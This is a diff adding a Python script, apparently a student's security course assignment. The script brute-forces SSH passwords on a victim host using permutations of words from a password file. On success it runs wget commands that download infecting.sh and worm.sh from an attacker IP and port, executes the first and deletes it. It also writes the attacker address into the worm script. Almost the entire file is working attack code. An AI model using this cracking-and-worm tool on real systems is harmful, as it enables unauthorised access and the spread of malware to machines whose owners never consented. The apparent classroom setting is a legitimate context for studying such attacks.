@@ -1,0 +1,110 @@
+#!/usr/bin/env python3
+# coding: utf-8
+"""
+Author: Kuan Ju, Chen
+ID: 0711529
+Date: 2021/05/06
+"""
+
+import paramiko
+import itertools,string,crypt
+import sys
+import time
+
+# username = "c0711529" #csc2021
+username = "csc2021"
+password_file = "/home/csc2021/materials/victim.dat"
+# password_file = "./victim_1.dat"
+ 
+victim_ip = "127.0.0.1"
+attacker_ip = ""
+attacker_port = 0
+sshport = 22
+
+def transfer_worm(ssh, username, password):
+	# transfer worm
+	print("Transfer worm...")
+	ssh.exec_command("wget http://%s:%s/infecting.sh"%(attacker_ip, attacker_port))
+	time.sleep(0.5)
+	ssh.exec_command("wget http://%s:%s/worm.sh"%(attacker_ip, attacker_port))
+	time.sleep(0.5)
+	
+	# exec
+	print("Exec....")
+	ssh.exec_command("chmod 755 infecting.sh")
+	ssh.exec_command("./infecting.sh")
+	time.sleep(0.5)
+		
+	# rm
+	print("Removing file...")
+	ssh.exec_command("rm ./infecting.sh")
+	# print(stdout.readlines())
+	
+def worm_attacker_ip():
+	file = open("./worm.sh", "r")
+	content = file.read()
+	file.close()
+	
+	pos_ip = content.find("attacker_ip=")
+	pos_port = content.find("attacker_port=")
+	pos_replacing = content.find("#replacing")
+	if pos_ip != -1 or pos_port != -1 or pos_replacing != -1:
+		content = content[:pos_ip+len("attacker_ip=")] + attacker_ip  + "\nattacker_port=" + attacker_port + content[pos_replacing-1:] 
+		file = open("./worm.sh", "w")
+		file.write(content)
+		file.close()
+	else:
+		print("Error of writing ip and port!")
+	
+
+def ssh_connect(password):
+	ssh = paramiko.client.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	try: 
+		print('Attempt: '+password)
+		ssh.connect(victim_ip, port=int(sshport), username=username, password=password, auth_timeout=0.5)
+	except paramiko.AuthenticationException:
+		ssh.close()
+		print("Connect Failure!") # Print to attempt notification line
+	else:
+		print("Connect Success! "+username+"@"+victim_ip+":"+str(sshport)+" Password: "+password)
+		transfer_worm(ssh, username, password)
+		ssh.close()
+		sys.exit(0)
+
+def	dict_crack():
+	# open the password list file
+	try:
+		f = open(password_file, 'r')
+	except OSError:
+		sys.exit(password_file+" file open error!")
+	
+	password_list = []
+	for line in f.readlines():
+		password = line.strip('\n')
+		password_list.append(password)
+		
+	for length in range(1, len(password_list)+1):
+		for password in allwords(password_list, length):
+			# print(password)
+			ssh_connect(password)
+	
+	# All fail
+	f.close()
+	print("Unsuccessfully to crack")
+
+def allwords(password_list, length):
+	for res in itertools.permutations(password_list, length):
+		yield ''.join(res)
+
+if __name__=="__main__":	
+	# get the argv parameters 
+	try:
+		victim_ip = sys.argv[1] # victim_ip
+		attacker_ip = sys.argv[2]
+		attacker_port = sys.argv[3]
+	except:
+		sys.exit("crack_attack <victim_ip> <attacker_ip> <attacker_port>")
+	
+	worm_attacker_ip()
+	dict_crack()
